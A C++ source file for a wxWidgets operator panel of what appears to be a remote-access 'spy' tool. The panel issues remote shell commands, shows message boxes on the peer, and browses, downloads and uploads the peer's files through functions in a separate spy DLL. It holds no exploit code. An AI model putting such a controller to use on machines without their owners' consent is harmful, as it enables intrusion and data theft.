#include "stdafx.h"
#include "SpyUserPanel.h"
#include "../../Network/Network.h"
#include "VirtualFileCtrl.h"
#include "../../Utility/UtilityManager.h"
#include "../../Utility/StringHelper/StringHelper.h"
#include <WinSock2.h>
#include <wx/listctrl.h>
#include <wx/textctrl.h>
#include <Shlwapi.h>

static const size_t COMMAND_SEND_TEXT_COLOR = 0xFF000000;
static const size_t COMMAND_RECEIVE_TEXT_COLOR = 0xFFFF0000;

CSpyUserPanel::CSpyUserPanel(const SBeatsSocket* pSockInfo,
                             HMODULE hSpyDLLHandle,
                             wxWindow *parent, 
                             wxWindowID winid /*= wxID_ANY*/, 
                             const wxPoint& pos /*= wxDefaultPosition*/, 
                             const wxSize& size /*= wxDefaultSize*/, 
                             long style /*= wxTAB_TRAVERSAL | wxNO_BORDER*/, 
                             const wxString& name /*= wxPanelNameStr*/ )
: super(parent, winid, pos, size, style, name)
, m_pSocketInfo(pSockInfo)
, m_pDiskInfoCache(NULL)
, m_pRootDirectoryCache(NULL)
, m_hSpyDllHandle(hSpyDLLHandle)
, m_uCurSelectHistoryIndex(0)
{
    BEATS_ASSERT(hSpyDLLHandle != NULL, _T("Invalid spy dll handle!"));
    wxBoxSizer* pUserPanelSizer = new wxBoxSizer(wxHORIZONTAL);

    wxBoxSizer* pLeftSizer = new wxBoxSizer(wxVERTICAL);
    wxStaticBoxSizer* pInfoSizer = new wxStaticBoxSizer(wxVERTICAL, this, _T("详细信息"));
    sockaddr_in sockaddrInfo;
    int nSize = sizeof(sockaddrInfo);
    bool bGetPeerSuccess = SOCKET_ERROR != ::getpeername(pSockInfo->m_socket, (sockaddr*)(&sockaddrInfo), &nSize); 
    m_pPeerAddrLabel = new wxStaticText(this, wxID_ANY, bGetPeerSuccess ? 
                                                        wxString::Format(_T("节点地址: %s:%d"), inet_ntoa(sockaddrInfo.sin_addr), sockaddrInfo.sin_port):
                                                        wxString(_T("节点地址:获取失败")));
    pInfoSizer->Add(m_pPeerAddrLabel, 0, wxEXPAND, 0);

    m_pPeerNameLabel = new wxStaticText(this, wxID_ANY, _T("节点名称: Unknown"));
    pInfoSizer->Add(m_pPeerNameLabel, 0, wxEXPAND, 0);

    FILETIME fileTime;
    SYSTEMTIME sysTime;
    GetLocalTime(&sysTime);
    SystemTimeToFileTime(&sysTime, &fileTime);
    
    ULARGE_INTEGER curTimeLarge;
    memcpy(&curTimeLarge, &fileTime, sizeof(curTimeLarge));
    curTimeLarge.QuadPart = curTimeLarge.QuadPart - GetTickCount() + m_pSocketInfo->m_uCreateTime;
    memcpy(&fileTime, &curTimeLarge, sizeof(fileTime));
    FileTimeToSystemTime(&fileTime, & sysTime);

    m_pConnectTimeInfoLabel = new wxStaticText(this, wxID_ANY, wxString::Format(_T("连接建立时间: %d:%d.%d.%d"), sysTime.wHour, sysTime.wMinute, sysTime.wSecond, sysTime.wMilliseconds));
    pInfoSizer->Add(m_pConnectTimeInfoLabel, 0, wxEXPAND, 0);

    m_pCurrentStateLabel = new wxStaticText(this, wxID_ANY, _T("当前状态: 空闲"));
    pInfoSizer->Add(m_pCurrentStateLabel, 0, wxEXPAND, 0);

    m_pUploadSpeedLabel = new wxStaticText(this, wxID_ANY, _T("上传速度: 0 kb/s"));
    pInfoSizer->Add(m_pUploadSpeedLabel, 0, wxEXPAND, 0);
    m_pUploadDataCountLabel = new wxStaticText(this, wxID_ANY, _T("上传数据量: 0 bytes"));
    pInfoSizer->Add(m_pUploadDataCountLabel, 0, wxEXPAND, 0);

    m_pDownloadSpeedLabel = new wxStaticText(this, wxID_ANY, _T("下载速度: 0 kb/s"));
    pInfoSizer->Add(m_pDownloadSpeedLabel, 0, wxEXPAND, 0);
    m_pDownloadDataCountLabel = new wxStaticText(this, wxID_ANY, _T("下载数据量: 0 bytes"));
    pInfoSizer->Add(m_pDownloadDataCountLabel, 0, wxEXPAND, 0);

    wxStaticBoxSizer* pSpyConsoleSizer = new wxStaticBoxSizer(wxVERTICAL, this, _T("命令控制台"));
    m_pConsoleTextCtrl = new wxTextCtrl(this, wxID_ANY, _T(""), wxDefaultPosition, wxDefaultSize, wxTE_RICH | wxTE_MULTILINE | wxTE_READONLY | wxTE_DONTWRAP);
    pSpyConsoleSizer->Add(m_pConsoleTextCtrl, 1, wxEXPAND, 0);
    
    m_pConsoleInputTextCtrl = new wxTextCtrl( this, wxID_ANY, wxEmptyString, wxDefaultPosition, wxDefaultSize, wxTE_NO_VSCROLL | wxTE_PROCESS_ENTER );
    m_pConsoleInputTextCtrl->SetMaxLength( 256 ); 
    pSpyConsoleSizer->Add( m_pConsoleInputTextCtrl, 0, wxEXPAND, 5 );

    pInfoSizer->Add(pSpyConsoleSizer, 1, wxEXPAND, 0);

    pLeftSizer->Add(pInfoSizer, 1, wxEXPAND, 0);
    pUserPanelSizer->Add(pLeftSizer, 1, wxEXPAND, 0);
    wxBoxSizer* pRightSizer = new wxBoxSizer(wxVERTICAL);
    pUserPanelSizer->Add(pRightSizer, 1, wxEXPAND, 0);

    wxStaticBoxSizer* pSpyFuncSizer = new wxStaticBoxSizer(wxVERTICAL, this, _T("功能区"));
    wxBoxSizer* pCommandExecutionSizer = new wxBoxSizer(wxHORIZONTAL);
    m_pExecuteCommandButton = new wxButton(this, wxID_ANY, _T("执行"));
    m_pCommandChoice = new wxChoice( this, wxID_ANY, wxDefaultPosition, wxDefaultSize, eSCT_Count, Command_Type_String, 0 );
    m_pCommandChoice->SetSelection( 0 );
    pCommandExecutionSizer->Add(m_pCommandChoice, 1, wxEXPAND, 0);
    pCommandExecutionSizer->Add(m_pExecuteCommandButton, 0, wxEXPAND, 0);
    pSpyFuncSizer->Add(pCommandExecutionSizer, 0, wxEXPAND, 0);

    wxStaticBoxSizer* pFileExplorerSizer = new wxStaticBoxSizer(wxVERTICAL, this, _T("远程文件"));
    wxBoxSizer* pFileLocationSizer = new wxBoxSizer(wxHORIZONTAL);
    wxStaticText* pFileLocationLabel = new wxStaticText(this, wxID_ANY, _T("地址"));
    pFileLocationSizer->Add(pFileLocationLabel, 0, wxALIGN_CENTER | wxALL, 0);
    m_pFileLocationText = new wxTextCtrl(this, wxID_ANY);
    pFileLocationSizer->Add(m_pFileLocationText, 1, wxEXPAND | wxLEFT | wxRIGHT , 5);
    m_pRefreshFileInfoButton = new wxButton(this, wxID_ANY, _T("刷新"));
    pFileLocationSizer->Add(m_pRefreshFileInfoButton, 0, wxALIGN_CENTER | wxALL, 0);
    pFileExplorerSizer->Add(pFileLocationSizer, 0, wxEXPAND, 0);

    m_pRemoteFileCtrl = new CVirtualFileCtrl(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT);
    pFileExplorerSizer->Add(m_pRemoteFileCtrl, 1, wxEXPAND, 5);

    pRightSizer->Add(pSpyFuncSizer, 0, wxEXPAND, 0);
    pRightSizer->Add(pFileExplorerSizer, 1, wxEXPAND, 0);
    
    this->SetSizer(pUserPanelSizer);

    m_pConsoleInputTextCtrl->Connect( wxEVT_COMMAND_TEXT_ENTER, wxCommandEventHandler( CSpyUserPanel::OnSpyConsoleCommandEnter ), NULL, this );
    m_pConsoleInputTextCtrl->Connect( wxEVT_KEY_UP, wxKeyEventHandler( CSpyUserPanel::OnSpyConsoleCommandKeypress), NULL, this );
    m_pExecuteCommandButton->Connect( wxEVT_COMMAND_BUTTON_CLICKED, wxCommandEventHandler( CSpyUserPanel::OnSpyCommandExecuteBtnClick ), NULL, this );
    m_pRemoteFileCtrl->Connect(wxEVT_COMMAND_LIST_ITEM_ACTIVATED, wxListEventHandler(CSpyUserPanel::OnSpyFileItemActivated), NULL, this);
    m_pRemoteFileCtrl->Connect(wxEVT_CONTEXT_MENU, wxContextMenuEventHandler(CSpyUserPanel::OnSpyRightClickFileCtrl), NULL, this);
    this->Connect(wxEVT_COMMAND_MENU_SELECTED, wxMenuEventHandler(CSpyUserPanel::OnSpySelectFileCtrlMenu), NULL, this);
    m_pRefreshFileInfoButton->Connect( wxEVT_COMMAND_BUTTON_CLICKED, wxCommandEventHandler( CSpyUserPanel::OnSpyRefreshFileBtnClick ), NULL, this );
    
    // Do some initialize action.
    SendCommand("cd");
    GetFileInfo(_T(""), true);
}

CSpyUserPanel::~CSpyUserPanel()
{
    BEATS_SAFE_DELETE(m_pRootDirectoryCache);
    BEATS_SAFE_DELETE(m_pDiskInfoCache);
}

void CSpyUserPanel::SendCommand(const char* pszCommand)
{
    // predefine some local command.
    if (_stricmp(pszCommand, "cls") == 0)
    {
        m_pConsoleTextCtrl->Clear();
    }
    else
    {
        typedef void(*TCommandFeedBackFunc)(const char*, void* );
        typedef bool (*TSendSystemCommandFunc)(SOCKET, const char*, TCommandFeedBackFunc, void*);
        static TSendSystemCommandFunc pSendCommandFunc = TSendSystemCommandFunc(GetProcAddress(m_hSpyDllHandle, "Spy_SendSystemCommand"));
        BEATS_ASSERT( pSendCommandFunc != NULL, _T("Get function address %s failed!"), _T("Spy_SendSystemCommand"));
        if (pSendCommandFunc != NULL)
        {
            pSendCommandFunc(m_pSocketInfo->m_socket, pszCommand, OnSystemCommandFeedback, this);
        }
    }
}

void CSpyUserPanel::OnSpyConsoleCommandEnter( wxCommandEvent& /*event*/ )
{
    wxString command = m_pConsoleInputTextCtrl->GetValue();
    if (command.Len() > 0)
    {
        m_pConsoleTextCtrl->SetDefaultStyle(wxTextAttr(*wxBLACK));
        m_pConsoleTextCtrl->AppendText(command + _T("\n"));
        m_pConsoleInputTextCtrl->Clear();
        SendCommand(command);
        SendCommand("cd");
        m_historyCommand.push_back(command.ToStdString());
        m_uCurSelectHistoryIndex = m_historyCommand.size();
    }
}

void CSpyUserPanel::OnSpyConsoleCommandKeypress(wxKeyEvent& event)
{
    if (event.GetKeyCode() == WXK_DOWN)
    {
        if (m_uCurSelectHistoryIndex + 1 < m_historyCommand.size())
        {
            ++m_uCurSelectHistoryIndex;
            m_pConsoleInputTextCtrl->SetValue(m_historyCommand[m_uCurSelectHistoryIndex]);
            m_pConsoleInputTextCtrl->SetInsertionPointEnd();
        }
    }
    else if (event.GetKeyCode() == WXK_UP)
    {
        if (m_uCurSelectHistoryIndex > 0)
        {
            -- m_uCurSelectHistoryIndex;
            BEATS_ASSERT(m_uCurSelectHistoryIndex < m_historyCommand.size(), _T("Invalid index occurs!"));
            m_pConsoleInputTextCtrl->SetValue(m_historyCommand[m_uCurSelectHistoryIndex]);
            m_pConsoleInputTextCtrl->SetInsertionPointEnd();
        }
    }
}

void CSpyUserPanel::OnSpyCommandExecuteBtnClick(wxCommandEvent& /*event*/)
{
    switch (m_pCommandChoice->GetSelection())
    {
        case eSCT_SendMsg:
        {
            wxString capital = wxGetTextFromUser(_T("请输入想显示在弹窗中的标题"), _T("消息弹窗"));
            if (capital.length() > 0)
            {
                wxString msg = wxGetTextFromUser(_T("请输入想显示在弹窗中的消息"), _T("消息弹窗"));
                if (msg.length() > 0)
                {
                    typedef bool (*TSendMessageBoxFunc)(SOCKET, const TCHAR*, const TCHAR*);
                    static TSendMessageBoxFunc pSendMessageBoxFunc = TSendMessageBoxFunc(GetProcAddress(m_hSpyDllHandle, "Spy_SendMessageCommand"));
                    BEATS_ASSERT(pSendMessageBoxFunc != NULL, _T("Get function address %s failed!"), _T("Spy_SendMessageCommand"));
                    if (pSendMessageBoxFunc != NULL)
                    {
                        pSendMessageBoxFunc(m_pSocketInfo->m_socket, msg, capital);
                    }
                }
            }
        }
        break;
        default:
            break;
    }
}

void CSpyUserPanel::OnSpyFileItemActivated(wxListEvent& event)
{
    wxString strCurLocaitoin = m_pFileLocationText->GetValue();
    bool bIsRootLocation = strCurLocaitoin.Length() == 3 && strCurLocaitoin[1] == _T(':');
    wxString strItem = event.GetItem().GetText();
    wxString strNewLocation = strItem;
    if (strCurLocaitoin != _T("我的电脑"))
    {
        if (*strCurLocaitoin.rbegin() != _T('\\'))
        {
            strCurLocaitoin.append(_T("\\"));
        }
        strNewLocation = strCurLocaitoin.append(strItem);
    }
    TCHAR szPath[MAX_PATH];
    if (strItem == _T("..") && bIsRootLocation)
    {
        szPath[0] = 0;
    }
    else
    {
        PathCanonicalize(szPath, strNewLocation);
    }    
    GetFileInfo(szPath, false);
}

void CSpyUserPanel::OnSpyRefreshFileBtnClick(wxCommandEvent& /*event*/)
{
    GetFileInfo(m_pFileLocationText->GetValue(), true);
}

void CSpyUserPanel::OnSpyRightClickFileCtrl(wxContextMenuEvent& /*event*/)
{
    wxMenu fileMenu;
    fileMenu.Append(eSUPUIID_DownloadMenu, _T("下载选中文件"));
    fileMenu.Append(eSUPUIID_UploadMenu, _T("上传到该文件夹"));
    PopupMenu(&fileMenu, wxDefaultPosition);
}

void CSpyUserPanel::OnSpySelectFileCtrlMenu(wxMenuEvent& event)
{
    switch (event.GetId())
    {
    case eSUPUIID_DownloadMenu:
        {
            TString strStorePath;
            if (CUtilityManager::GetInstance()->AcquireDirectory(this->GetHWND(), strStorePath, _T("选择保存的位置")))
            {
                typedef bool (*TDownloadFileFunc)(SOCKET sock, const std::vector<TString>& files, const TString& strStorePath, CFileFilter* pFilter);
                static TDownloadFileFunc pDownloadFunc = TDownloadFileFunc(GetProcAddress(m_hSpyDllHandle, "Spy_DownloadFiles"));
                BEATS_ASSERT(pDownloadFunc != NULL, _T("Get function address %s failed!"), _T("Spy_DownloadFiles"));
                if (pDownloadFunc != NULL)
                {
                    std::vector<TString> files;
                    size_t uSelectedCount = m_pRemoteFileCtrl->GetSelectedItemCount();
                    if (uSelectedCount == 0)
                    {
                        const TString& curPath = m_pRemoteFileCtrl->GetCurrentDirectoryPath();
                        if (curPath.length() > 0)
                        {
                            files.push_back(curPath);
                        }
                    }
                    else
                    {
                        size_t uCounter = 0;
                        long item = m_pRemoteFileCtrl->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
                        while ( item != -1 && uCounter++ < uSelectedCount )
                        {
                            TString curPath = m_pRemoteFileCtrl->GetCurrentDirectoryPath();
                            files.push_back(curPath.append(m_pRemoteFileCtrl->GetItemText(item)));
                            item = m_pRemoteFileCtrl->GetNextItem(item, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
                        }
                    }
                    BEATS_ASSERT(files.size() > 0, _T("Can't start download with nothing!"));
                    if (files.size() > 0 && strStorePath.length() > 0)
                    {
                        pDownloadFunc(m_pSocketInfo->m_socket, files, strStorePath, NULL);
                    }
                }
            }
        }
        break;
    case eSUPUIID_UploadMenu:
        {
            std::vector<TString> strPath;
            bool bGetUploadFiles = CUtilityManager::GetInstance()->AcquireMuiltyFilePath(true, this->GetHWND(), strPath, _T("选择上传的文件"), NULL, NULL);
            if (bGetUploadFiles)
            {
                typedef bool (*TUploadFileFunc)(SOCKET sock, const std::vector<TString>& files, const TString& strStorePath, CFileFilter* pFilter);
                static TUploadFileFunc pUploadFunc = TUploadFileFunc(GetProcAddress(m_hSpyDllHandle, "Spy_UploadFiles"));
                BEATS_ASSERT(pUploadFunc != NULL, _T("Get function address %s failed!"), _T("Spy_DownloadFiles"));
                if (pUploadFunc != NULL)
                {
                    TString curPath = m_pRemoteFileCtrl->GetCurrentDirectoryPath();
                    BEATS_ASSERT(curPath.length() > 0 && strPath.size() > 0, _T("Upload failed! upload files size: %d store path: %s"), strPath.size(), curPath.c_str());
                    if (curPath.length() > 0 && strPath.size() > 0)
                    {
                        pUploadFunc(m_pSocketInfo->m_socket, strPath, curPath, NULL);
                    }
                    else
                    {
                        MessageBox(this->GetHWND(), _T("Current path is not valid!"), NULL, MB_OK);
                    }
                }
            }
        }
        break;
    default:
        BEATS_ASSERT(false, _T("Never Reach Here!"));
        break;
    }
}

void CSpyUserPanel::AddFeedback(const char* pszFeedback)
{
    if (pszFeedback != NULL)
    {
        m_pConsoleTextCtrl->SetDefaultStyle(wxTextAttr(*wxRED));
        m_pConsoleTextCtrl->AppendText(pszFeedback);
    }
}

void CSpyUserPanel::GetFileInfo(const TCHAR* pszFilePath, bool bRefresh)
{
    BEATS_ASSERT(pszFilePath != NULL, _T("File path is NULL!"));
    bool bUseCache = false;
    if (!bRefresh)
    {
        if (pszFilePath[0] == 0)
        {
            if (m_pDiskInfoCache != NULL)
            {
                UpdateFileUI(2, m_pDiskInfoCache);
                bUseCache = true;
            }
        }
        else
        {
            if (m_pRootDirectoryCache != NULL)
            {
                SDirectory* pDirectory = GetCache(pszFilePath);
                if (pDirectory != NULL)
                {
                    UpdateFileUI(1, pDirectory);
                    bUseCache = true;
                }
            }
        }
    }
    if (!bUseCache)
    {
        typedef void(*TFileInfoFeedbackFunc)(char m_type, void* pFileInfo, void* pUserDataPtr);
        typedef bool (*TGetFileInfoFunc)(SOCKET sock, const TCHAR* pszCmd, TFileInfoFeedbackFunc pFeedbackFunc, void* pUserDataPtr);
        static TGetFileInfoFunc pGetFileInfoFunc = TGetFileInfoFunc(GetProcAddress(m_hSpyDllHandle, "Spy_SendFileInfoCommand"));
        BEATS_ASSERT(pGetFileInfoFunc != NULL, _T("Get function address %s failed!"), _T("Spy_SendFileInfoCommand"));
        if (pGetFileInfoFunc != NULL)
        {
            pGetFileInfoFunc(m_pSocketInfo->m_socket, pszFilePath, OnGetFileInfo, this);
        }
    }
}

void CSpyUserPanel::UpdateDirectoryCache(const SDirectory* pDirectory)
{
    BEATS_ASSERT(m_pRootDirectoryCache, _T("The cache mustn't be NULL!"));
    std::vector<TString> result;
    CStringHelper::GetInstance()->SplitString(pDirectory->m_szPath.c_str(), _T("\\"), result, false);
    SDirectory* pCurCache = m_pRootDirectoryCache;
    TString strCurPath;
    for (size_t i = 0; i < result.size(); ++i)
    {
        strCurPath.append(result[i]).append(_T("\\"));
        SDirectory* pChildDirectory = pCurCache->GetChild(strCurPath);
        if (pChildDirectory == NULL)
        {
            // Add a place holder directory to build the path.
            pChildDirectory = new SDirectory(NULL, strCurPath.c_str());
            pCurCache->m_pDirectories->push_back(pChildDirectory);
        }
        // if the cache is a place holder, reset the parent to indicate that it is updated.
        if (i == result.size() - 1 && pChildDirectory->m_pParent == NULL)
        {
            pChildDirectory->m_pParent = pCurCache;
        }
        pCurCache = pChildDirectory;
    }
    
    //1. Sync the child directories data.
    BEATS_ASSERT(pDirectory->m_szPath == pCurCache->m_szPath, _T("The cache path must be the same with it!"));
    for (size_t i = 0; i < pDirectory->m_pDirectories->size(); ++i)
    {
        SDirectory* pChildDirectory = pDirectory->m_pDirectories->at(i);
        SDirectory* pCacheChildDirectory = pCurCache->GetChild(pChildDirectory->m_szPath);
        if (pCacheChildDirectory == NULL)
        {
            // Add new child of the cache, which are also place holders.
            pCacheChildDirectory = new SDirectory(NULL, pChildDirectory->m_szPath.c_str());
            pCurCache->m_pDirectories->push_back(pCacheChildDirectory);
        }
        memcpy(&pCacheChildDirectory->m_data, &pChildDirectory->m_data, sizeof(WIN32_FIND_DATA));
    }
    // Delete the redundant child of the cache.
    if (pCurCache->m_pDirectories->size() > pDirectory->m_pDirectories->size())
    {
        for (std::vector<SDirectory*>::iterator iter = pCurCache->m_pDirectories->begin(); iter != pCurCache->m_pDirectories->end(); )
        {
            SDirectory* pChild = pDirectory->GetChild((*iter)->m_szPath);
            if (pChild == NULL)
            {
                BEATS_SAFE_DELETE(*iter);
                iter = pCurCache->m_pDirectories->erase(iter);
            }
            else
            {
                ++iter;
            }
        }
    }
    // 2. Sync the files data.
    int iSizeDelta = pCurCache->m_pFileList->size() - pDirectory->m_pFileList->size();
    for (int i = 0; i < iSizeDelta; ++i)
    {
        WIN32_FIND_DATA* pData = pCurCache->m_pFileList->back();
        BEATS_SAFE_DELETE(pData);
        pCurCache->m_pFileList->pop_back();
    }
    for (int i = 0; i < -iSizeDelta; ++i)
    {
        WIN32_FIND_DATA* pData = new WIN32_FIND_DATA;
        pCurCache->m_pFileList->push_back(pData);
    }
    BEATS_ASSERT(pCurCache->m_pFileList->size() == pDirectory->m_pFileList->size(), _T("The data size must be the same now!"));
    for (size_t i = 0; i < pCurCache->m_pFileList->size(); ++i)
    {
        memcpy(pCurCache->m_pFileList->at(i), pDirectory->m_pFileList->at(i), sizeof(WIN32_FIND_DATA));
    }
}

SDirectory* CSpyUserPanel::GetCache(const TString& strPath) const
{
    SDirectory* pCache = NULL;
    if (m_pRootDirectoryCache != NULL)
    {
        std::vector<TString> result;
        CStringHelper::GetInstance()->SplitString(strPath.c_str(), _T("\\"), result, false);
        SDirectory* pCurDirectory = m_pRootDirectoryCache;
        TString strCurPath;
        bool bFind = true;
        for (size_t i = 0; i < result.size(); ++i)
        {
            strCurPath.append(result[i]).append(_T("\\"));
            SDirectory* pChildDirectory = pCurDirectory->GetChild(strCurPath);
            if (pChildDirectory == NULL)
            {
                bFind = false;
                break;
            }
            pCurDirectory = pChildDirectory;
        }
        // Check the parent == NULL to indicate if it is a place holder.
        // If it is a place holder, we return NULL to get the fresh data and update the cache.
        if (bFind && pCurDirectory->m_pParent != NULL)
        {
            pCache = pCurDirectory;
        }
    }
    return pCache;
}

void CSpyUserPanel::UpdateFileUI(char type, void* pData)
{
    switch (type)
    {
    case 0:
        break;
    case 1:
        {
            SDirectory* pDirectory = (SDirectory*)pData;
            m_pFileLocationText->SetValue(pDirectory->m_szPath.c_str());
            m_pRemoteFileCtrl->SetCurrentDirectory(pDirectory);
        }
        break;
    case 2:
        {
            SDiskInfo* pDiskInfo = (SDiskInfo*)pData;
            m_pFileLocationText->SetValue(_T("我的电脑"));
            m_pRemoteFileCtrl->SetDiskInfo(pDiskInfo);
        }
        break;
    default:
        BEATS_ASSERT(false, _T("Invalid type of File data!"));
        break;
    }
}

void CSpyUserPanel::OnSystemCommandFeedback(const char* pszFeedback, void* pUserData)
{
    BEATS_ASSERT(pUserData != NULL, _T("Invalid user data for spy user panel!"));
    if (pszFeedback[0] != 0)
    {
        CSpyUserPanel* pCurPanel = (CSpyUserPanel*) pUserData;
        pCurPanel->AddFeedback(pszFeedback);
    }
}

void CSpyUserPanel::OnGetFileInfo(char type, void* pFileInfo, void* pUserData)
{
    BEATS_ASSERT(pUserData != NULL, _T("Invalid user data for spy user panel!"));
    CSpyUserPanel* pCurPanel = (CSpyUserPanel*) pUserData;
    bool bSuccess = true;
    switch (type)
    {
    case 0://eFIT_File:
        bSuccess = false;
        //pCurPanel->m_pRemoteFileCtrl->SetDiskInfo()
        break;
    case 1://eFIT_Directory:
        {
            if (pCurPanel->m_pRootDirectoryCache == NULL)
            {
                pCurPanel->m_pRootDirectoryCache = new SDirectory(NULL, _T("Root"));
            }
            pCurPanel->UpdateDirectoryCache((SDirectory*)pFileInfo);
        }
        break;
    case 2://eFIT_Disk:
        {
            if (pCurPanel->m_pDiskInfoCache == NULL)
            {
                pCurPanel->m_pDiskInfoCache = new SDiskInfo;
            }
            (*pCurPanel->m_pDiskInfoCache) = *(SDiskInfo*)pFileInfo;
        }
        break;
    case 3://eFIT_Error
        {
            bSuccess = false;
            BEATS_ASSERT(false, _T("Error in get file info! Desc:%s"), (const TCHAR*)pFileInfo);
        }
        break;
    default:
        break;
    }
    if (bSuccess)
    {
        pCurPanel->UpdateFileUI(type, pFileInfo);
    }
}
